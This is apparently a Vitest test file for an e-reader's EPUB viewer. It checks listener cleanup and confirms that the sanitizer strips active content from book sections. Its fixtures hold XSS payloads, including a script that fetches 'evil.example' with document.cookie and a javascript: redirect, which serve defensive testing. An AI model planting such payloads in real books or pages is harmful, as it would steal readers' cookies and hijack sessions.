import { render, waitFor } from '@testing-library/react';
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import type { ComponentProps } from 'react';
import FoliateViewer from '@/app/reader/components/FoliateViewer';

const { readerState, openGate, bookDataState, viewSettingsState } = vi.hoisted(() => {
  return {
    bookDataState: { bookData: null as unknown },
    openGate: { pending: null as Promise<void> | null, started: false },
    viewSettingsState: { allowScript: false as boolean },
    readerState: {
      setProgress: vi.fn(),
      getViewState: () => ({}),
      getViewSettings: () => ({ writingMode: 'auto', allowScript: viewSettingsState.allowScript }),
      setView: () => {},
      setViewInited: () => {},
    },
  };
});

vi.mock('@/store/readerStore', () => ({
  useReaderStore: (select: (s: typeof readerState) => unknown) => select(readerState),
}));
vi.mock('@/store/bookDataStore', () => ({
  useBookDataStore: (select: (s: { getBookData: () => unknown }) => unknown) =>
    select({ getBookData: () => bookDataState.bookData }),
}));
vi.mock('@/store/parallelViewStore', () => ({ useParallelViewStore: () => () => [] }));
vi.mock('@/store/settingsStore', () => ({
  useSettingsStore: Object.assign(() => ({ settings: {} }), { getState: () => ({ settings: {} }) }),
}));
vi.mock('@/store/themeStore', () => ({ useThemeStore: () => ({}) }));
vi.mock('@/store/customFontStore', () => ({
  useCustomFontStore: () => ({ getLoadedFonts: () => [], getAvailableFonts: () => [] }),
}));
vi.mock('@/context/EnvContext', () => ({ useEnv: () => ({}) }));
vi.mock('next/navigation', () => ({ useSearchParams: () => null }));
vi.mock('@/hooks/useTranslation', () => ({ useTranslation: () => (text: string) => text }));
vi.mock('@/libs/document', () => ({}));
vi.mock('foliate-js/view.js', () => ({}));
vi.mock('@/types/view', () => ({
  wrappedFoliateView: (view: HTMLElement & { book?: unknown }) => {
    const anyCall: object = new Proxy(() => anyCall, { get: () => anyCall, apply: () => anyCall });
    return Object.assign(view, {
      open: async (book: unknown) => {
        view.book = book;
        openGate.started = true;
        await openGate.pending;
      },
      init: async () => {},
      goToFraction: async () => {},
      renderer: anyCall,
    });
  },
}));
vi.mock('@/utils/style', async (importOriginal) => ({
  ...(await importOriginal<object>()),
  getStyles: () => '',
}));
vi.mock('@/services/transformService', async (importOriginal) => importOriginal());
vi.mock('@/app/reader/utils/wordlensSection', () => ({}));
vi.mock('@/app/reader/hooks/useFoliateEvents', () => ({ useFoliateEvents: vi.fn() }));
vi.mock('@/app/reader/hooks/useBrightnessGesture', () => ({ useBrightnessGesture: () => ({}) }));
vi.mock('@/app/reader/hooks/useAutoScroll', () => ({ useAutoScroll: () => ({}) }));
vi.mock('@/app/reader/hooks/useAutoScrollSpeedGesture', () => ({
  useAutoScrollSpeedGesture: () => ({}),
}));
vi.mock('@/app/reader/hooks/useMiddleClickAutoscroll', () => ({
  useMiddleClickAutoscroll: () => null,
}));
vi.mock('@/app/reader/hooks/useKOSync', () => ({ useKOSync: () => ({}) }));
vi.mock('@/app/reader/hooks/useIframeEvents', () => ({
  useMouseEvent: () => ({}),
  useTouchEvent: () => ({}),
  useOpenMediaEvent: () => {},
}));
vi.mock('@/app/reader/hooks/useCapturedTurn', () => ({
  useCapturedTurn: () => {},
  applyPageTurnAttributes: () => {},
}));
vi.mock('@/app/reader/hooks/usePagination', () => ({ usePagination: () => ({}) }));
vi.mock('@/app/reader/hooks/useProgressSync', () => ({ useProgressSync: () => {} }));
vi.mock('@/app/reader/hooks/useABSProgressSync', () => ({ useABSProgressSync: () => {} }));
vi.mock('@/app/reader/hooks/useProgressAutoSave', () => ({ useProgressAutoSave: () => {} }));
vi.mock('@/app/reader/hooks/useAutoSaveBookCover', () => ({ useBookCoverAutoSave: () => {} }));
vi.mock('@/app/reader/hooks/useFileSync', () => ({ useFileSync: () => {} }));
vi.mock('@/app/reader/hooks/useTextTranslation', () => ({ useTextTranslation: () => {} }));
vi.mock('@/hooks/useBackgroundTexture', () => ({
  useBackgroundTexture: () => ({ applyBackgroundTexture: vi.fn() }),
}));
vi.mock('@/hooks/useAutoFocus', () => ({ useAutoFocus: () => {} }));
vi.mock('@/hooks/useEinkMode', () => ({ useEinkMode: () => ({ applyEinkMode: () => {} }) }));
vi.mock('@/hooks/useUICSS', () => ({ useUICSS: () => {} }));
vi.mock('@/hooks/useDiscordPresence', () => ({ useDiscordPresence: () => {} }));
vi.mock('@/app/reader/hooks/bookOrbitProgressProvider', () => ({ bookOrbitProgressProvider: {} }));
vi.mock('@/app/reader/components/paragraph', () => ({ ParagraphControl: () => null }));
vi.mock('@/app/reader/components/BrightnessOverlay', () => ({ default: () => null }));
vi.mock('@/app/reader/components/ImageViewer', () => ({ default: () => null }));
vi.mock('@/app/reader/components/TableViewer', () => ({ default: () => null }));

// #6710: the book document outlives the reader (bookDataStore caches it for
// the next open), so a listener the view adds to its transformTarget keeps
// that closed view, its iframes and their listeners alive, one more per open.
function instrument(target: EventTarget) {
  const live = new Set<EventListenerOrEventListenerObject>();
  const add = target.addEventListener.bind(target);
  const remove = target.removeEventListener.bind(target);
  target.addEventListener = (type, listener, options) => {
    if (listener) live.add(listener);
    add(type, listener, options);
  };
  target.removeEventListener = (type, listener, options) => {
    if (listener) live.delete(listener);
    remove(type, listener, options);
  };
  return live;
}

function setup() {
  bookDataState.bookData = null;
  const transformTarget = new EventTarget();
  const live = instrument(transformTarget);
  const props = {
    bookKey: 'test-book',
    bookDoc: { metadata: {}, transformTarget },
    config: {},
    gridInsets: { top: 0, right: 0, bottom: 0, left: 0 },
    contentInsets: { top: 0, right: 0, bottom: 0, left: 0 },
  } as unknown as ComponentProps<typeof FoliateViewer>;
  return { live, props, transformTarget };
}

it('removes its transformTarget listeners when the reader closes', async () => {
  openGate.pending = null;
  const { live, props } = setup();
  const { unmount } = render(<FoliateViewer {...props} />);
  await waitFor(() => expect(live.size).toBeGreaterThan(0));
  unmount();
  expect(live.size).toBe(0);
});

it('leaves no transformTarget listeners when the reader closes while the book is opening', async () => {
  let finishOpen = () => {};
  openGate.pending = new Promise<void>((resolve) => {
    finishOpen = resolve;
  });
  openGate.started = false;
  const { live, props } = setup();
  const { unmount } = render(<FoliateViewer {...props} />);
  await waitFor(() => expect(openGate.started).toBe(true));
  unmount();
  finishOpen();
  await new Promise((resolve) => setTimeout(resolve, 0));
  expect(live.size).toBe(0);
});

// Manifest media types are hand-written; a section must not dodge the
// sanitizers through casing, parameters, or an XML type that still renders
// as an active document.
async function transform(type: string, name: string, data: unknown) {
  openGate.pending = null;
  const { live, props, transformTarget } = setup();
  bookDataState.bookData = {
    bookDoc: { sections: [{ id: 'OPS/chapter.xml' }, { id: 'OPS/cover.svg' }] },
  };
  render(<FoliateViewer {...props} />);
  await waitFor(() => expect(live.size).toBeGreaterThan(0));
  const detail = { data, type, name };
  transformTarget.dispatchEvent(new CustomEvent('data', { detail }));
  const result = await detail.data;
  return { result, type: detail.type };
}

it('sanitizes an SVG section whose media type has odd casing and parameters', async () => {
  const svg =
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>';
  const { result, type } = await transform('Image/SVG+xml; charset=utf-8', 'OPS/cover.svg', svg);
  expect(type).toBe('image/svg+xml');
  expect(result).not.toMatch(/script|onload/);
});

it('serves an XML section as plain text', async () => {
  const blob = new Blob(['<html xmlns="http://www.w3.org/1999/xhtml"><script/></html>']);
  const { result, type } = await transform('text/xml', 'OPS/chapter.xml', blob);
  expect(type).toBe('text/plain');
  expect(result).toBe(blob);
});

it('leaves the type of a non-section resource alone apart from normalizing it', async () => {
  const blob = new Blob(['font']);
  const { type } = await transform('application/vnd.ms-opentype', 'OPS/font.otf', blob);
  expect(type).toBe('application/vnd.ms-opentype');
});

// A book section reaches the reader iframe as `srcdoc`, and that iframe is
// same-origin with the app (`sandbox="allow-same-origin allow-scripts"` in
// foliate's paginator). Anything that still executes in it therefore runs with
// the app's own privileges, Tauri IPC included.
//
// What keeps a book from executing there is the reader's transform hook:
// foliate dispatches 'data' with the section's HTML, the reader runs the
// sanitizer transformer over it, and the sanitized string is what the paginator
// puts in the iframe (`loadContent()` returns it, and the blob URL the iframe
// loads is built from the same string). These tests walk that whole chain on a
// real EPUB, so a change that drops the sanitizer from the reader's transform
// list, or that stops applying it to the section, fails here.
const CONTAINER = `<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OPS/book.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>`;

const OPF = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" unique-identifier="BookID" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Active Content Test</dc:title>
    <dc:language>en</dc:language>
    <dc:identifier id="BookID">urn:uuid:active-content</dc:identifier>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
    <item id="script" href="app.js" media-type="text/javascript"/>
    <item id="payload" href="payload.html" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="chapter1"/>
  </spine>
</package>`;

const NAV = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <body><nav epub:type="toc"><ol><li><a href="chapter1.xhtml">One</a></li></ol></nav></body>
</html>`;

// Every vector that would let a book run code, or pull a document of its own
// into the app origin, in a single section.
const CHAPTER = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><script src="app.js"></script></head>
  <body>
    <p onmouseover="window.parent.postMessage('pwned', '*')">Chapter</p>
    <a href="javascript:window.parent.location='https://evil.example'">Click</a>
    <iframe src="payload.html"></iframe>
    <object data="payload.html"></object>
    <embed src="payload.html"></embed>
    <script>window.parent.fetch('https://evil.example/' + document.cookie)</script>
  </body>
</html>`;

const FILES: Record<string, string> = {
  'META-INF/container.xml': CONTAINER,
  'OPS/book.opf': OPF,
  'OPS/nav.xhtml': NAV,
  'OPS/chapter1.xhtml': CHAPTER,
  'OPS/app.js': 'void 0',
  'OPS/payload.html':
    '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>void 0</script></body></html>',
};

const openEpub = async () => {
  const { EPUB } = await import('foliate-js/epub.js');
  const epub = new EPUB({
    entries: Object.keys(FILES).map((filename) => ({ filename })),
    loadText: async (name: string) => FILES[name] ?? null,
    loadBlob: async (name: string) => (FILES[name] == null ? null : new Blob([FILES[name]!])),
    getSize: (name: string) => FILES[name]?.length ?? 0,
    sha1: undefined,
  });
  await epub.init();
  return epub;
};

// jsdom implements neither half of the object-URL API.
const originalCreate = URL.createObjectURL;
const originalRevoke = URL.revokeObjectURL;

beforeEach(() => {
  let nextId = 0;
  URL.createObjectURL = () => `blob:test/${nextId++}`;
  URL.revokeObjectURL = () => {};
  viewSettingsState.allowScript = false;
});

afterEach(() => {
  URL.createObjectURL = originalCreate;
  URL.revokeObjectURL = originalRevoke;
});

// Renders the reader over a real EPUB and returns the string the paginator
// would put in the section iframe.
async function renderChapter() {
  openGate.pending = null;
  const epub = await openEpub();
  const live = instrument(epub.transformTarget as EventTarget);
  const { props } = setup();
  bookDataState.bookData = { bookDoc: epub, isFixedLayout: false };
  const bookDoc = epub as unknown as ComponentProps<typeof FoliateViewer>['bookDoc'];
  render(<FoliateViewer {...props} bookDoc={bookDoc} />);
  await waitFor(() => expect(live.size).toBeGreaterThan(0));
  const section = (epub.sections ?? [])[0]!;
  await section.load();
  return { content: (await section.loadContent()) as string };
}

it('strips the active content of a book section before it reaches the reader iframe', async () => {
  const { content } = await renderChapter();

  // The book still renders...
  expect(content).toContain('Chapter');
  // ...but nothing in it can execute, reach the parent frame, or pull a
  // document of its own into the app origin.
  expect(content).not.toMatch(/<script/i);
  expect(content).not.toMatch(/onmouseover/i);
  expect(content).not.toMatch(/javascript:/i);
  expect(content).not.toMatch(/<iframe/i);
  expect(content).not.toMatch(/<object/i);
  expect(content).not.toMatch(/<embed/i);
  expect(content).not.toMatch(/srcdoc/i);
});

it('keeps the book scripts when the reader is set to allow them', async () => {
  // `allowScript` is the reader's opt-in for interactive books, and it is off
  // by default. With it on, the book's own scripts run in the iframe, which is
  // same-origin with the app: that is the documented trade-off of the setting,
  // not something the sanitizer can take away.
  viewSettingsState.allowScript = true;
  const { content } = await renderChapter();

  expect(content).toMatch(/<script/i);
});
